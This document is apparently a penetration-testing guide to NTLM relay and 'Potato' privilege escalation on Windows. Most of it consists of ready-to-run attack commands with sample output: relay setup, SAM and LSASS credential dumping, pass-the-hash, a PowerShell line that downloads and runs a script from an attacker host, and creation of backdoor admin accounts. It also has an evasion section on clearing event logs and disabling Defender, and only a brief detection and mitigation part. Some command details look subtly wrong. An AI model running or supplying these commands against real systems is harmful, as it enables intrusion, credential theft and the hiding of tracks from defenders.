# NTLM-Based Privilege Escalation

### Overview

**NTLM Elevation of Privilege** refers to a class of attacks that exploit weaknesses in Windows NTLM (NT LAN Manager) authentication protocol to escalate privileges from a standard user to higher levels like Administrator or SYSTEM. These attacks typically leverage NTLM relay techniques, where an attacker tricks a Windows system into authenticating to an attacker-controlled server, then relays those credentials to perform privileged actions.

The "Potato" family of exploits (RemotePotato, LocalPotato, and others) are specific implementations that abuse Windows COM (Component Object Model) services and NTLM authentication flows to achieve privilege escalation. These attacks are particularly dangerous in domain environments where captured credentials can be relayed to other systems.

**Key Concepts:**

* **NTLM Relay** - Intercepting and forwarding NTLM authentication attempts to different targets
* **COM Services** - Windows Component Object Model used for inter-process communication
* **Session Hijacking** - Leveraging active user sessions to escalate privileges
* **NetNTLMv2** - Network NTLM version 2 authentication protocol used by Windows
* **CLSID** - Class Identifier used to reference COM objects in Windows

**Why This Works:**

* Windows services authenticate using NTLM by default
* COM objects can be triggered to authenticate to attacker-controlled endpoints
* NTLM authentication doesn't bind to specific targets (relay vulnerability)
* Many environments don't enforce SMB signing (allows relay attacks)

**Attack Prerequisites:**

* Valid user account on target system
* Ability to execute code on target
* Network access between attacker and target
* SMB signing disabled on relay targets (for relay attacks)

**Common Scenarios:**

* Terminal servers with multiple logged-in administrators
* Domain-joined workstations with cached admin credentials
* Systems with local administrator privileges to other machines
* Environments without NTLM relay protections

***

### Exploitation Workflow Summary

1. Environment Assessment ├─ Identify target systems (terminal servers, admin workstations) ├─ Check current user privileges ├─ Enumerate active sessions └─ Verify SMB signing status on targets
2. Attack Infrastructure Setup ├─ Configure attacker listener (socat) ├─ Set up NTLM relay (ntlmrelayx) ├─ Identify appropriate CLSID for target OS └─ Prepare relay targets
3. Trigger NTLM Authentication ├─ Execute RemotePotato/LocalPotato on target ├─ Specify session ID and CLSID ├─ Force authentication to attacker └─ Capture NetNTLMv2 hash
4. Relay Authentication ├─ Forward captured authentication ├─ Authenticate to relay target ├─ Execute privileged actions └─ Dump credentials or gain shell
5. Post-Exploitation ├─ Extract SAM database hashes ├─ Obtain SYSTEM privileges ├─ Establish persistence └─ Lateral movement preparation

***

### RemotePotato Attack

#### Understanding RemotePotato

**RemotePotato** exploits NTLM relay vulnerabilities in Windows by forcing a privileged process to authenticate to an attacker-controlled server. It's particularly effective on terminal servers where administrators are actively logged in, as it can hijack their sessions to relay their credentials.

**How it works:**

1. Triggers a COM object to initiate NTLM authentication
2. Redirects authentication to attacker's IP
3. Attacker relays authentication to target SMB service
4. Executes commands with elevated privileges

**Why terminal servers are ideal targets:**

* Multiple administrators logged in simultaneously
* Active sessions with elevated privileges
* Often used for administrative tasks
* Higher chance of domain admin sessions

#### Scenario 1: Relay NetNTLMv2 to SMB

**Purpose:** Capture and relay administrator credentials from a terminal server to gain access to other systems.

**On the target system:**

```cmd
RemotePotato.exe -m 2 -r 10.0.0.5 -x 10.0.0.5 -s 2 -c 5167B42F-C111-47A1-ACC4-8EABE61B0B54
```

**Parameters explained:**

* `-m 2` - Mode 2 (NTLM relay mode)
* `-r 10.0.0.5` - RPC redirector IP (attacker's machine)
* `-x 10.0.0.5` - RPC server IP (attacker's machine)
* `-s 2` - Session ID to target (find with `query user` command)
* `-c 5167B42F-C111-47A1-ACC4-8EABE61B0B54` - CLSID for target OS version

**Finding session IDs:**

```cmd
query user
```

**Expected output:**

```
 USERNAME              SESSIONNAME        ID  STATE   IDLE TIME  LOGON TIME
>john                  console             1  Active          .  12/20/2025 9:00 AM
 admin                 rdp-tcp#0           2  Active      1:30  12/20/2025 8:00 AM
 domainadmin           rdp-tcp#1           3  Active         10  12/20/2025 7:30 AM
```

**Why this matters:** Session ID 3 belongs to a domain admin—perfect target for relay attack.

**Common CLSIDs by OS:**

* **Windows 10/11, Server 2016/2019/2022:** `5167B42F-C111-47A1-ACC4-8EABE61B0B54`
* **Windows Server 2012:** `F8842F8E-DAFE-4B37-9D38-4E0714A61149`
* **Windows Server 2008:** `5167B42F-C111-47A1-ACC4-8EABE61B0B54`

**On attacker system (Terminal 1):**

**Set up TCP redirector:**

```bash
socat TCP-LISTEN:135,fork,reuseaddr TCP:10.0.0.10:9999
```

**Parameters explained:**

* `TCP-LISTEN:135` - Listen on port 135 (RPC port)
* `fork` - Create new process for each connection
* `reuseaddr` - Allow socket reuse
* `TCP:10.0.0.10:9999` - Forward to target's port 9999

**Expected output:**

```
[+] Listening on 0.0.0.0:135
[+] Forwarding to 10.0.0.10:9999
```

**On attacker system (Terminal 2):**

**Set up NTLM relay:**

```bash
impacket-ntlmrelayx -t smb://10.0.0.20 -smb2support -socks -c "whoami"
```

**Parameters explained:**

* `-t smb://10.0.0.20` - Target to relay authentication to
* `-smb2support` - Enable SMB2/3 protocol support
* `-socks` - Create SOCKS proxy for relayed connections
* `-c "whoami"` - Command to execute on successful relay

**Expected output:**

```
[*] Servers started, waiting for connections
[*] HTTPD(80): Connection from 10.0.0.10:49832
[*] SMB connection from 10.0.0.10:49833
[*] Authenticating against smb://10.0.0.20 as DOMAIN/ADMIN
[*] SMBD: Received connection from 10.0.0.10
[+] Relay successful! Executing command...
nt authority\system
```

**Success indicators:**

* "Relay successful" message appears
* Command executes with elevated privileges
* Returns SYSTEM or Administrator level access

#### Scenario 2: Dump Local SAM Hives

**Purpose:** Relay NTLM authentication to remotely dump password hashes from another system where you have local admin rights.

**On target system:**

```cmd
RemotePotato0.exe -m 0 -r 10.0.0.5 -x 10.0.0.5 -p 9999 -s 2 -c F8842F8E-DAFE-4B37-9D38-4E0714A61149
```

**Parameters explained:**

* `-m 0` - Mode 0 (alternative exploitation mode)
* `-r 10.0.0.5` - RPC redirector IP (attacker)
* `-x 10.0.0.5` - RPC server IP (attacker)
* `-p 9999` - RPC server port
* `-s 2` - Session ID to hijack
* `-c F8842F8E-DAFE-4B37-9D38-4E0714A61149` - CLSID for COM object

**On attacker system (Terminal 1):**

**Set up port forwarding:**

```bash
socat TCP-LISTEN:135,fork,reuseaddr TCP:10.0.0.10:9999
```

**On attacker system (Terminal 2):**

**Set up NTLM relay with secretsdump:**

```bash
impacket-ntlmrelayx -t 10.0.0.20 -smb2support --no-http-server --no-wcf-server
```

**Alternative with automatic dumping:**

```bash
impacket-ntlmrelayx -t 10.0.0.20 -smb2support -c "reg save HKLM\\SAM C:\\temp\\sam.hive"
```

**Expected output:**

```
[*] Servers started, waiting for connections
[*] SMBD: Received connection from 10.0.0.10
[*] Authenticating against 10.0.0.20 as DOMAIN/ADMIN
[+] SMBD: Connection successful
[*] Dumping local SAM hashes
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
LocalAdmin:1001:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:::
```

**Hash format explained:**

* `Username:RID:LM_Hash:NTLM_Hash:::`
* **LM\_Hash** - Legacy LAN Manager hash (often disabled)
* **NTLM\_Hash** - NT hash used for authentication
* **RID** - Relative Identifier (user ID)

**Using dumped hashes:**

```bash
# Pass-the-hash attack
impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c LocalAdmin@10.0.0.20
```

***

### LocalPotato Attack

#### Understanding LocalPotato (CVE-2023-21746)

**LocalPotato** exploits a vulnerability in Windows NTLM authentication (CVE-2023-21746) that allows local privilege escalation to SYSTEM without requiring network relay. This vulnerability affects Windows 10, Windows 11, and Windows Server 2016/2019/2022 systems prior to security updates released in January 2023.

**Key difference from RemotePotato:**

* No network relay required
* Direct local privilege escalation
* Exploits NTLM SSPI vulnerability
* Works even with SMB signing enabled
* Simpler attack chain

**Affected systems:**

* Windows 10 (all versions before January 2023 patches)
* Windows 11 (all versions before January 2023 patches)
* Windows Server 2016
* Windows Server 2019
* Windows Server 2022

**CVE Details:**

* **CVE-2023-21746** - Windows NTLM Elevation of Privilege Vulnerability
* **CVSS Score:** 7.8 (High)
* **Published:** January 10, 2023
* **Patched:** January 2023 Patch Tuesday

#### Basic LocalPotato Exploitation

**On target system:**

```cmd
LocalPotato.exe -i cmd.exe
```

**Parameters explained:**

* `-i cmd.exe` - Interactive mode, spawns cmd.exe with SYSTEM privileges

**Expected output:**

```
[*] LocalPotato by @decoder_it and @splinter_code
[*] Trying to trigger NTLM authentication...
[+] NTLM authentication triggered successfully
[*] Performing privilege escalation...
[+] Success! Spawning SYSTEM shell...

Microsoft Windows [Version 10.0.19044.2364]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
nt authority\system
```

**Alternative execution modes:**

**Execute specific command:**

```cmd
LocalPotato.exe -c "net user hacker P@ssw0rd! /add"
```

**Create reverse shell:**

```cmd
LocalPotato.exe -c "powershell -c IEX(New-Object Net.WebClient).DownloadString('http://10.0.0.5/shell.ps1')"
```

**Dump credentials:**

```cmd
LocalPotato.exe -c "reg save HKLM\\SAM C:\\temp\\sam.hive && reg save HKLM\\SYSTEM C:\\temp\\system.hive"
```

#### Advanced LocalPotato Techniques

**Chain with other tools:**

**Dump LSASS memory:**

```cmd
LocalPotato.exe -c "C:\\tools\\procdump.exe -accepteula -ma lsass.exe C:\\temp\\lsass.dmp"
```

**Create administrative user:**

```cmd
LocalPotato.exe -c "net user backdoor P@ssw0rd123! /add && net localgroup administrators backdoor /add"
```

**Enable RDP access:**

```cmd
LocalPotato.exe -c "reg add \"HKLM\\System\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f"
```

**Why this is powerful:**

* No network interaction required
* Bypasses many security controls
* Works in isolated environments
* Fast and reliable exploitation

***

### Detection Evasion Techniques

#### Obfuscating RemotePotato Execution

**Rename executable:**

```cmd
copy RemotePotato.exe svchost.exe
svchost.exe -m 2 -r 10.0.0.5 -x 10.0.0.5 -s 2 -c 5167B42F-C111-47A1-ACC4-8EABE61B0B54
```

**Execute from memory (PowerShell):**

```powershell
$bytes = (New-Object Net.WebClient).DownloadData('http://10.0.0.5/RemotePotato.exe')
[System.Reflection.Assembly]::Load($bytes)
```

**Use alternative network ports:**

```bash
# On attacker, use non-standard ports
socat TCP-LISTEN:8080,fork,reuseaddr TCP:10.0.0.10:9999
```

#### Covering Tracks

**Clear event logs:**

```cmd
LocalPotato.exe -c "wevtutil cl System && wevtutil cl Security"
```

**Disable Windows Defender:**

```cmd
LocalPotato.exe -c "Set-MpPreference -DisableRealtimeMonitoring $true"
```

**Delete execution artifacts:**

```cmd
del /f /q RemotePotato.exe
del /f /q LocalPotato.exe
```

***

### Defense and Mitigation

#### Detecting Potato Attacks

**Windows Event Log indicators:**

**Event ID 4688 - Process Creation:**

```
Process Name: RemotePotato.exe
Process Name: LocalPotato.exe
Command Line: Contains "-m" or "-r" or "-x" flags
```

**Event ID 5145 - Network share access:**

```
Share Name: \\*\IPC$
Access: WriteData
Source: Suspicious process
```

**Sysmon detection rules:**

**Sysmon Event ID 1 - Process Creation:**

```xml
<Rule groupRelation="or">
  <ProcessCreate onmatch="include">
    <Image condition="contains">Potato</Image>
    <CommandLine condition="contains">-m 2</CommandLine>
    <CommandLine condition="contains">-r</CommandLine>
  </ProcessCreate>
</Rule>
```

#### Mitigation Strategies

**Apply security updates:**

```powershell
# Install January 2023 patches for CVE-2023-21746
Install-WindowsUpdate -AcceptAll -AutoReboot
```

**Enable SMB signing (prevents relay):**

```powershell
# Domain Policy
Set-GPRegistryValue -Name "Default Domain Policy" -Key "HKLM\System\CurrentControlSet\Services\LanmanServer\Parameters" -ValueName "RequireSecuritySignature" -Type DWord -Value 1

# Local setting
Set-SmbServerConfiguration -RequireSecuritySignature $True -Force
```

**Disable NTLM authentication (if possible):**

```powershell
# Group Policy: Computer Configuration → Windows Settings → Security Settings → Local Policies → Security Options
# Network security: LAN Manager authentication level = Send NTLMv2 response only. Refuse LM & NTLM
```

**Enable EPA (Extended Protection for Authentication):**

```powershell
Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Lsa" -Name "SuppressExtendedProtection" -Value 0
```

**Monitor COM object activation:**

```powershell
# Enable COM security logging
auditpol /set /subcategory:"Other Object Access Events" /success:enable /failure:enable
```

***

### Comparison: RemotePotato vs LocalPotato

| Feature                  | RemotePotato               | LocalPotato               |
| ------------------------ | -------------------------- | ------------------------- |
| **Network Required**     | Yes                        | No                        |
| **Attack Complexity**    | High                       | Low                       |
| **Prerequisites**        | Network relay setup        | None (just execute)       |
| **SMB Signing Bypass**   | No                         | Yes                       |
| **Patch Status**         | Various                    | CVE-2023-21746 patched    |
| **Detection Difficulty** | Medium                     | Easy (if logging enabled) |
| **Target Scope**         | Multiple systems           | Local system only         |
| **Privilege Level**      | Depends on relayed session | Always SYSTEM             |

***

### Troubleshooting

#### RemotePotato: No Authentication Received

**Problem:** RemotePotato executes but no NTLM authentication reaches attacker

**Solution:**

```bash
# Verify socat is listening
netstat -an | grep 135

# Check firewall rules
sudo iptables -L -n | grep 135

# Test connectivity from target
Test-NetConnection -ComputerName 10.0.0.5 -Port 135

# Try alternative CLSID
RemotePotato.exe -m 2 -r 10.0.0.5 -x 10.0.0.5 -s 2 -c F8842F8E-DAFE-4B37-9D38-4E0714A61149
```

**Why it works:** Different CLSIDs work on different Windows versions. Firewall might be blocking RPC traffic.

#### NTLM Relay: SMB Signing Enabled

**Problem:** ntlmrelayx fails with "Signing is required" error

**Solution:**

```bash
# Check if SMB signing is required on target
crackmapexec smb 10.0.0.20 --gen-relay-list relay_targets.txt

# Find targets without signing
cat relay_targets.txt

# Relay to targets without signing requirement
impacket-ntlmrelayx -tf relay_targets.txt -smb2support
```

**Why it works:** SMB signing prevents relay attacks. Target systems without signing enforcement can still be exploited.

#### LocalPotato: Access Denied

**Problem:** LocalPotato fails with access denied error

**Solution:**

```cmd
# Check Windows version and patch level
systeminfo | findstr /B /C:"OS Name" /C:"OS Version"

# Verify not patched for CVE-2023-21746
wmic qfe list | findstr "KB5022303"

# If patched, use alternative methods
# Try RemotePotato or other privilege escalation techniques
```

**Why it works:** Systems patched after January 2023 are not vulnerable to LocalPotato. Must use alternative techniques.

#### Session ID Invalid

**Problem:** RemotePotato fails to hijack specified session

**Solution:**

```cmd
# List all active sessions
query user

# Verify session is active
qwinsta

# Try session 0 (usually SYSTEM)
RemotePotato.exe -m 2 -r 10.0.0.5 -x 10.0.0.5 -s 0 -c 5167B42F-C111-47A1-ACC4-8EABE61B0B54

# If no sessions available, use LocalPotato instead
LocalPotato.exe -i cmd.exe
```

**Why it works:** Session must be active and accessible. Session 0 is always available as SYSTEM session.

#### Relay Target Unreachable

**Problem:** Cannot relay authentication to target system

**Solution:**

```bash
# Verify target is up
ping 10.0.0.20

# Check SMB service is running
nmap -p445 10.0.0.20

# Verify credentials would work
crackmapexec smb 10.0.0.20 -u username -p password

# Try alternative relay target
impacket-ntlmrelayx -t 10.0.0.21 -smb2support
```

**Why it works:** Target must have SMB service accessible and accepting connections. Alternative targets may have different security configurations.

***

### Quick Reference

#### RemotePotato Commands

```cmd
# Basic NTLM relay
RemotePotato.exe -m 2 -r ATTACKER_IP -x ATTACKER_IP -s SESSION_ID -c CLSID

# Dump SAM hashes
RemotePotato0.exe -m 0 -r ATTACKER_IP -x ATTACKER_IP -p 9999 -s SESSION_ID -c CLSID
```

#### LocalPotato Commands

```cmd
# Spawn SYSTEM shell
LocalPotato.exe -i cmd.exe

# Execute command as SYSTEM
LocalPotato.exe -c "command_here"

# Add admin user
LocalPotato.exe -c "net user hacker Pass123! /add && net localgroup administrators hacker /add"
```

#### Attacker Setup

```bash
# Port forwarding (Terminal 1)
socat TCP-LISTEN:135,fork,reuseaddr TCP:TARGET_IP:9999

# NTLM relay (Terminal 2)
impacket-ntlmrelayx -t TARGET_IP -smb2support -socks

# With command execution
impacket-ntlmrelayx -t TARGET_IP -smb2support -c "whoami"
```

#### Enumeration

```cmd
# List sessions
query user

# Check session details
qwinsta

# Verify SMB signing
crackmapexec smb TARGET_IP --gen-relay-list targets.txt
```

#### Common CLSIDs

```
Windows 10/11/Server 2016+: 5167B42F-C111-47A1-ACC4-8EABE61B0B54
Windows Server 2012:        F8842F8E-DAFE-4B37-9D38-4E0714A61149
Alternative:                 5167B42F-C111-47A1-ACC4-8EABE61B0B54
```

###
